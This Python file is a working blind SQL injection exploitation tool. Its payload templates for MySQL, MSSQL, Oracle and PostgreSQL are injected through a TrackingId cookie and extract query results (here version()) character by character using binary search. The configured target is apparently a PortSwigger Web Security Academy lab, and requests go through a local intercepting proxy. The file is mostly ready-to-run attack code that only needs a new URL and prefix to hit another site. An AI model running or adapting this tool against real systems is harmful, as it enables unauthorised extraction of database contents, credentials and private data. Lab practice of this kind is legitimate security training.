import requests
import time
import sys
import math
import urllib.parse
import urllib3

urllib3.disable_warnings()


class Condishql:
    """
    Extracts string data from a conditional SQLi vulnerability using a binary search tree approach.
    """

    payloads = {
        'mysql': {
            'length': 'LENGTH(({query})){operator}{value}',
            'character': 'SUBSTRING(({query}),{index},1){operator}CHR({value})',
            'string': 'STRCMP(({query}),{value})'
        },
        'mssql': {
            'length': 'LEN(({query})){operator}{value}',
            'character': 'SUBSTRING(({query}),{index},1){operator}CHR({value})',
            'string': '({query})=\'{value}\''
        },
        'oracle': {
            'length': 'LENGTH(({query})){operator}{value}',
            'character': 'SUBSTR(({query}),{index},1){operator}CHR({value})',
            'string': '({query})=\'{value}\''
        },
        'postgresql': {
            'length': 'LENGTH(({query})){operator}{value}',
            'character': 'SUBSTRING(({query}),{index},1){operator}CHR({value})',
            'string': '({query})=\'{value}\''
        },
    }

    initialLength = 16
    initialCharacter = ord('Z')

    def __init__(self, url, query, dbms, prefix, suffix, delay=0.25):
        self.url = url
        self.query = query
        self.delay = delay
        self.prefix = prefix
        self.suffix = suffix
        self.payloads = {
            'length': prefix + self.payloads[dbms]['length'] + suffix,
            'character': prefix + self.payloads[dbms]['character'] + suffix,
            'string': prefix + self.payloads[dbms]['string'] + suffix
        }

    def isMatch(self, response):  # Change me to whatever condition counts as True
        return "Welcome back!" in response.text
        # examples:
        # return response.status_code == 403
        # return response.elapsed > datetime.timedelta(milliseconds=100)
        # return len(response.content) > 11443

    def getValue(self, payload, args, range=(0, math.inf), context=None):
        """ Determines the value of a vairable based on a halving/doubling of the search space """
        min, max = range

        while min != max:

            greater = self.getMatch(payload.format(**args, operator='>'))

            if greater:
                min = args['value'] + 1
            else:
                max = args['value']

            if max == math.inf:
                # double value to find upper bound if not already found
                args['value'] *= 2
            else:
                # narrow down between that range
                args['value'] = min + int((max - min) / 2)

            if context:
                print(
                    f"[{context['i']}/{context['length']}: \x1B[90mBetween \'{chr(min)}\' and \'{chr(max)}\'\x1B[0m] \x1B[32m{context['result']}\x1B[0m", end='\r'
                )

            time.sleep(self.delay)

        # sanity check
        if not self.getMatch(payload.format(**args, operator='=')):
            raise ValueError

        return args['value']

    def getString(self, length):
        ''' Determines the value of each character in a [length]-long string '''

        result = ''

        for i in range(1, length + 1):
            args = {
                'query': self.query,
                'value': self.initialCharacter,
                'index': i
            }
            result += chr(self.getValue(
                payload=self.payloads['character'],
                args=args,
                range=(0x20, 0x7E),  # range of printable ASCII characters
                context={
                    'i': i,
                    'length': length,
                    'result': result,
                }
            ))

        # sanity check
        if not self.getMatch(self.payloads['string'].format(
                query=args['query'],
                value=result,
                operator='=')):
            raise ValueError

        print(f'\n{result}')

        return result

    def getMatch(self, payload):
        """Issues a request and determines truth value of query based on the response"""
        r = requests.get(
            self.url,
            proxies={
                "http": "https://127.0.0.1:8080",
                "https": "http://127.0.0.1:8080",
            },
            headers={
                # urlencode the payload
                'Cookie': f'TrackingId={urllib.parse.quote(payload)}'
            },
            verify=False,
        )

        return self.isMatch(r)

    def grab(self):
        

        try:
            args = {
                'query': self.query,
                'value': self.initialLength
            }
            length = self.getValue(self.payloads['length'], args)

            print(f'Query: \'{self.query}\'. Retrieving {length} characters:')

            return self.getString(length)
        except ValueError:
            print('The result was invalid, either due to a syntax error or because no result exists. Send the requests to Repeater and sanity check them.', file=sys.stderr)

    def parseFile(self, filename):
        return


if __name__ == "__main__":
    Condishql(
        # change me to your url
        url='https://0a5e00ef03d2284280ca5df0007700d4.web-security-academy.net/',
        # change me to your required data, e.g. @@version, user(),
            query='version()',
            prefix="FnGaVrqFvjVnSCv4' and ",											# change me to the prefix
            suffix=" and 'a'='a",														# change me to the suffix
            dbms='postgresql',
            delay=0,																	# change me to your desired delay
    ).grab()
